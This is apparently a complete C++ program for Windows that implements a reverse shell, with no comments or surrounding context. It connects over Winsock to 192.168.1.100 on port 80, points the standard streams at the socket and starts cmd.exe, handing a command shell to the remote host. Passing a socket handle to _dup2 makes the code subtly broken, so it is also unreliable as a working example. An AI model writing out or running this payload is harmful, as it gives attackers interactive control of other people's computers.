#include <winsock2.h>
#include <iostream>
#include <process.h>

#pragma comment(lib, "ws2_32.lib")

int main() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2,2), &wsaData);
    sock = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_port = htons(80);
    server.sin_addr.s_addr = inet_addr("192.168.1.100");

    connect(sock, (struct sockaddr *)&server, sizeof(server));
    _dup2(sock, 0);  
    _dup2(sock, 1);  
    _dup2(sock, 2);  

    _spawnl(_P_NOWAIT, "C:\\Windows\\System32\\cmd.exe", "cmd", NULL);
    return 0;
}